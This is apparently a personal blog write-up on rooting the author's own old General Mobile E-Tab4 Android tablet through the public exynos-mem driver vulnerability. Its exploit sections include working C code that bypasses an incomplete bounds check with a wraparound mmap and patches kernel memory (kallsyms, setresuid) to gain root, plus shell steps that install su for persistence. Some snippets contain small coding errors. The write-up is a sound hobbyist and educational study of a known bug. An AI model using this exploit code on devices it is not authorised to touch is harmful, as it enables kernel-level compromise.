---
layout: post
title: "Roots in the Past: General Mobile E-Tab4"
tags: pwn android
---

I had an old Android tablet dusting away. I wanted to repurpose it but with a
little twist: I wanted to root it with my own code, instead of using a root app
like KingRoot or Framaroot. In the end I got root with a known exploit (it's
even included in Framaroot). Here's my writeup (and a little retrospective).

## the past

I tinkered with mobile devices until late into my highschool years, mainly for
the reason that I didn't have a decent pc and I had very limited access to the
internet. I don't mean tinkering in the sense that I programmed them or
anything, just that I would download whatever app and game I could scrape off of
mobile forums and try them on my phone. Back then Symbian was the king of mobile
os'es. Apps and games in the Symbian ecosystem were fascinating. I remember
playing an Ngage version of Call of Duty on my Nokia 6630 (which isn't an ngage
device) with occasional crashes; nevertheless it was playable. (Mind you it was
a proper 3d first-person game, not some cheap knockoff for mobile phones.) I
used to play Game Boy Advance games (especially Pokemon) on my N73 with a
cracked emulator. Multiplayer fps shooters over bluetooth, task managers, office
suites... I could give many other fun examples, but I digress.

In the meantime I saw news of the emerging mobile devices from Google with their
own operating system called Android. Phones were already pricey, so I already
knew phones would be out of my reach even they were sold here. Though I saw
devices in another form on the rise too: The now-widely-used tablets. Without
GSM access and big screens, Android tablets were on the cheaper side and they
provided (almost) the very same Android experience as the phones. So I saved up
and got myself an Archos 7 home tablet.

{% include aligner.html images="/roots-in-the-past/archos7.jpg" width=75
caption="Archos 7 home tablet: My first Android device" %}

I tinkered with that tablet like I tinkered with my previous devices, just
installing and playing with a bunch of apps and games. I didn't hack the device,
nor I sought any technical know-how to do so.

Over the years I owned many other Android devices. At some point I learned the
existence of custom roms and recoveries. To install them I had to root the
device. The techniques and tools were already available already most of the
time, so I didn't really bother learning anything about the process. Just a
number of clicks and I had a rooted device. The custom roms were a whole other
world, though I stood at the consumer side on that too.

The curiosity finally hit me and I wanted to finally learn how the whole rooting
thing worked. It was a perfect opportunity with the devices I stashed in the
past. So I started working on the General Mobile E-Tab4. In the end it turned
out to be simple, but whatever.

## the exploit

{% include aligner.html images="/roots-in-the-past/gm-etab4.jpg" width=90
caption="The target: General Mobile E-tab4" %}

The tablet is originally used as a digital platform to aid in education in
highschools and it came with an MDM (Mobile Device Management) platform
preinstalled, which prevented the use of many functions and required login for
the rest. After some years of use, they were abandoned as a platform and a rom
without MDM was released to allow the use of the device as a regular tablet.  I
received it with the non-MDM rom.

{% include aligner.html images="/roots-in-the-past/version.png" width=100 %}

Android 4.2.2 is installed with kernel version 3.0.40. To root the device there
are some attack surface to consider:

- Processes on root privilege
- Kernel drivers
- Kernel itself

I already knew most of the easy pwns were possible because of vulnerable
drivers so I chose to take a look at the drivers first. I fired up an adb shell
and went through `/dev` directory. I looked for devices that unprivileged
processes can access.

{% include aligner.html images="/roots-in-the-past/dev.png" width=90 %}

Immediately some familiar devices like `ashmem` and `binder` popped up. Although
binder is known to be vulnerable in more recent kernel versions, `exynos-mem`
looked like a more approachable device because of the implication in its name.
When I googled the name I was pleasantly surprised to find a vulnerability
associated with it and learn that it can map the whole physical memory to
userspace [[1]]. I was more surprised to learn that the `o+rw` access that is
the cause of the vulnerability was not a misconfiguration. Turns out the camera
app uses this device to access [CMA] memory. It's just that the driver does not
check if the user is trying to map a CMA memory or not.

[1]: https://web.archive.org/web/20221128194111/https://forum.xda-developers.com/t/root-security-root-exploit-on-exynos.2048511/
[CMA]: https://developer.toradex.com/linux-bsp/how-to/linux-features/contiguous-memory-allocator-cma-linux/

{% include aligner.html images="/roots-in-the-past/xda.png" width=90 %}

The author also released an exploit. Since the code is open, I felt no need to
reinvent the wheel and tried it on the device.

{% include aligner.html images="/roots-in-the-past/xda2.png" width=60 %}

### mapping the system ram

And it failed. The `mmap` call failed with `Invalid argument` error. Possible
reasons for this error are the following:

```
   EINVAL We don't like addr, length, or offset (e.g., they are too
          large, or not aligned on a page boundary).

   EINVAL (since Linux 2.6.12) length was 0.

   EINVAL flags contained none of MAP_PRIVATE, MAP_SHARED, or
          MAP_SHARED_VALIDATE.
```

The second and third reasons don't apply since `length` is nonzero and
`MAP_SHARED` is set. So it must be that the driver "didn't like" the
parameters. Unfortunately that doesn't really explain anything. So let's take a
look at the code and then analyze the kernel code to figure out the cause of the
error.

```c
#define PAGE_OFFSET 0xC0000000
#define PHYS_OFFSET 0x40000000

/* kernel reside at the start of physical memory, so take some Mb */
paddr = (unsigned long *)mmap(NULL, length, PROT_READ|PROT_WRITE, MAP_SHARED, fd, PHYS_OFFSET);
tmp = paddr;
if (paddr == MAP_FAILED) {
    printf("[!] Error mmap: %s|%08X\n",strerror(errno), i);
    exit(1);
} 
```

After opening the device file `/dev/exynos-mem`, the exploit tries to map the
system ram (assumed to be at `0x40000000`), with enough length to access the
kernel code. The length in the code is calculated as `page_size * page_size`
(with `0x400` page size, this equals to 1MB), which should not cause trouble.
The physical offset can be confirmed with `/proc/iomem`:

```
40000000-7fefffff : System RAM
  4003c000-4080afff : Kernel text
  4080c000-409f2daf : Kernel data
```

Since the call looks ok, time to see if the driver agrees. I pulled the kernel
binary from a filesystem dump and loaded it in ghidra. The function that handles
the `mmap` call has the following block:

{% include aligner.html images="/roots-in-the-past/mmap.png" width=100 %}

It seems like the vulnerability is patched in this code. The function
`cma_is_registered_region` checks if the mmap range is within the ranges in
the array `cma_regions`. At first I thought this was a deadend and searched for
info on the patch. The patch was posted in the XDA post, however I noticed that
the error strings did not match. Then I searched the web for the exact message
and found a post about an "incomplete fix" [[2]].

[2]: http://blog.azimuthsecurity.com/2013/02/re-visiting-exynos-memory-mapping-bug.html

{% include aligner.html images="/roots-in-the-past/incomplete.png" width=70 %}

The post explains that the implemented bounds check is faulty and still allows
arbitrary mapping. Let's take a look at how that happens. Here's the bounds
check implementation:

```c
bool cma_is_registered_region(phys_addr_t start, size_t size)
{
   struct cma_region *reg;

   cma_foreach_region(reg) {
       if ((start >= reg->start) &&
           ((start + size) <= (reg->start + reg->size)))
           return true;
   }
   return false;
}
```

Notice that the start and end addresses are checked indepentently, meaning that
as long as start is bigger than the region start and end is smaller than the
region end, the check succeeds. There are two ways to pass this check:

- have [start, end] range inside the region,
- set a size large enough that the end address wraps around the memory and
    becomes small.

Obviously the second way is unintended but it's very much possible to pull off.

{% include aligner.html images="/roots-in-the-past/mmap.svg" width=100 %}

Setting `start` to the last page (which is `0xfffff000`) and `size` big enough
should allow me to map the system ram. However, I made some mistakes in pointer
arithmetic ops and failed to get the exploit to succeed. The post [[2]] explains
that there is an exploit available in Framaroot for this case and its named
"Frodo", so I pulled one of the older versions of Framaroot and reverse
engineered the exploit. The steps after this point were all under the guidence
of Framaroot code.

{% include aligner.html images="/roots-in-the-past/frodo.png" width=80 %}

My final call looks like this:

```c
/* kernel reside at the start of physical memory, so take some Mb */
// This mmap fails because the driver is patched to control the maps.
// However, the patch is incomplete and allows an overflow to bypass the check.
paddr = (unsigned long *)mmap(NULL, 0x50000000UL, PROT_READ|PROT_WRITE, MAP_SHARED, fd, 0xfffff000UL);
if (paddr == MAP_FAILED) {
    printf("[!] Error mmap: %s|%08X\n",strerror(errno), i);
    exit(1);
}
printf("[*] mmap success at 0x%lx\n", paddr);
```

This time mmap succeeded and the system ram was waiting for me at
`paddr+0x40000000`.

### patching kallsyms

The known exploit strategy here is to patch `setresuid` syscall to allow getting
root as an unprivileged user. First step is to find the address of the code in
memory. `/proc/kallsyms` is the place to look; however the addresses listed
in the file are not disclosed to unprivileged users, therefore useless as-is.
Fortunately it is easy to patch. Simply find the format string `%pK %c %s` and
change it to `%p  %c %s` [[4]].

[4]: https://elixir.bootlin.com/linux/v3.0.40/source/lib/vsprintf.c#L848

```c
info("Looking for magic bytes...");
/*
 * search the format string "%pK %c %s\n" in memory
 * and replace "%pK" by "%p" to force display kernel
 * symbols pointer
 */
for(m = 0; m < length*4; m += 4) {
    if(*(unsigned long *)tmp == 0x204b7025 && *(unsigned long *)(tmp+1) == 0x25206325 && *(unsigned long *)(tmp+2) == 0x00000a73 ) {
        printf("[*] s_show->seq_printf format string found at: 0x%08X\n", PAGE_OFFSET + m);
        restore_ptr_fmt = tmp;
        *(unsigned long*)tmp = 0x20207025;
        found = true;
        break;
    }
    tmp++;
}

if (found == false) {
    printf("[!] s_show->seq_printf format string not found\n");
    exit(1);
}
```

The output:

{% include aligner.html images="/roots-in-the-past/kallsyms0.png" width=70 %}

The code iterates in 4 byte increments because it is assumed that the string
will be 4 byte aligned.

{% include aligner.html
images="/roots-in-the-past/kallsyms1.png,/roots-in-the-past/kallsyms2.png"
caption="before and after the patch" width=95 %}

### patching setresuid

Now that `setresuid` address is known, let's see which part of the code requires
patching. Looking at the source code (Note that it might not be the exact
source but it'll do):

```c
/*
 * This function implements a generic ability to update ruid, euid,
 * and suid.  This allows you to implement the 4.4 compatible seteuid().
 */
SYSCALL_DEFINE3(setresuid, uid_t, ruid, uid_t, euid, uid_t, suid)
{
	const struct cred *old;
	struct cred *new;
	int retval;

	new = prepare_creds();
	if (!new)
		return -ENOMEM;

	old = current_cred();

	retval = -EPERM;
	if (!nsown_capable(CAP_SETUID)) {
		if (ruid != (uid_t) -1 && ruid != old->uid &&
		    ruid != old->euid  && ruid != old->suid)
			goto error;
		if (euid != (uid_t) -1 && euid != old->uid &&
		    euid != old->euid  && euid != old->suid)
			goto error;
		if (suid != (uid_t) -1 && suid != old->uid &&
		    suid != old->euid  && suid != old->suid)
			goto error;
	}

	if (ruid != (uid_t) -1) {
		new->uid = ruid;
		if (ruid != old->uid) {
			retval = set_user(new);
			if (retval < 0)
				goto error;
		}
	}
	if (euid != (uid_t) -1)
		new->euid = euid;
	if (suid != (uid_t) -1)
		new->suid = suid;
	new->fsuid = new->euid;

	retval = security_task_fix_setuid(new, old, LSM_SETID_RES);
	if (retval < 0)
		goto error;

	return commit_creds(new);

error:
	abort_creds(new);
	return retval;
}
```

The `nsown_capable` call is where our call as an unprivileged user will fail. So
if I modify the check I'll be able to set my own process id.


{% include aligner.html images="/roots-in-the-past/setresuid.png" width=55 %}

In the available exploit the compare is modified as `cmp r0, 1`. In raw bytes
it is changed from `0xe3500000` to `0xe3500001`.

```c
if (found) {
    tmp = paddr + kern_offset;
    tmp += (addr_sym - PAGE_OFFSET) >> 2;
    for(m = 0; m < 128; m += 4) {
        if (*(unsigned long *)tmp == 0xe3500000) {
            printf("[*] patching sys_setresuid at 0x%08X\n",addr_sym+m);
            restore_ptr_setresuid = tmp;
            *(unsigned long *)tmp = 0xe3500001;
            break;
        }
        tmp++;
    }
    break;
}
```

After the patch, it's only a matter of a `setresuid` call:

```c
/* ask for root */
info("asking for root...");
result = setresuid(0, 0, 0);

if (result) {
    printf("[!] set user root failed: %s\n", strerror(errno));
    exit(1);
}
```

{% include aligner.html images="/roots-in-the-past/root.png" width=100 %}

## the root

I got the root shell with ease, now what? Now it's time for persistence of
course. In order to do that, I need to inject the `su` binary and `SuperSU` app
I pulled from framaroot into `/system`, which is normally read-only. So the next
step is to remount the `/system` mount.

### remounting /system as rw

It is possible to remount using the root shell, though I wanted to do it all
without interactions so I implemented it in C. To remount, I grab the name of
the block device that is mounted at `/system` and call `/system/bin/mount`.

{% include aligner.html images="/roots-in-the-past/mounts.png" width=100
caption="this is how the mounts look" %}

```c
info("remount /system");
unsigned char *sptr = NULL, *token = NULL, *bufferptr = NULL;
unsigned char buffer[0x1000];

FILE *mfd = fopen("/proc/mounts", "r");
if (mfd == NULL) {
    fatal("failed opening /proc/mounts");
}

unsigned char *tokens[6];
// fgets terminates on EOF or newline
while (fgets(buffer, sizeof(buffer), mfd)) {
    bufferptr = buffer;
    // char *strtok_r(char *str, const char *delim, char **saveptr);
    for (int i=0; i<6; i++, bufferptr = NULL) {
        tokens[i] = strtok_r(bufferptr, " ", &sptr);
        info("token: %s", tokens[i]);
    }

    if (strcmp("/system", tokens[1]) == 0) {
        info("/system mount is %s", tokens[0]);
        break;
    }
}

int pid;
char args[] = {"/system/bin/mount", "-o", "remount,rw", tokens[0], tokens[1], NULL};
if (pid = fork() == 0) {
    execve(args[0], args, NULL);
    exit(0);
}

int stat_loc;
waitpid(&stat_loc);
```

### handling the rest with a shell script

After remounting `/system` with write access, the rest of the steps are as
follows:

- copy `su` into `/system/xbin`
- link `/system/xbin/su` to `/system/bin/su`
- copy `Superuser.apk` into `/system/app`
- set permissions
- install `Superuser.apk`

Since all of the steps can easily be done in shell, it makes more sense to call
`sh` with a script.

```shell
export PATH=$PATH:/system/bin:/system/xbin
cp /data/local/tmp/su /system/xbin/su
chown root:root /system/xbin/su
chmod 6755 /system/xbin/su
ln -s /system/xbin/su /system/bin/su
cp /data/local/tmp/Superuser.apk /system/app/Superuser.apk
chown root:root /system/app/Superuser.apk
chmod 644 /system/app/Superuser.apk
pm install /system/app/Superuser.apk
```

Adding everything together:

{% include aligner.html images="/roots-in-the-past/final.png" width=80 %}

Since the superuser app is also installed, other apps can request root access
too.

{% include aligner.html images="/roots-in-the-past/app.png" width=100 %}

## where to now?

Next I'll install a custom recovery (namely TWRP) and fiddle with custom roms.
Then I'll try to find an exciting idea to repurpose the device. I'll probably go
for either a sensor-related or a smart-home application. 

As for "Roots in the Past", I'm planning to write a couple more posts like this
with more modern devices in the future. Till then.
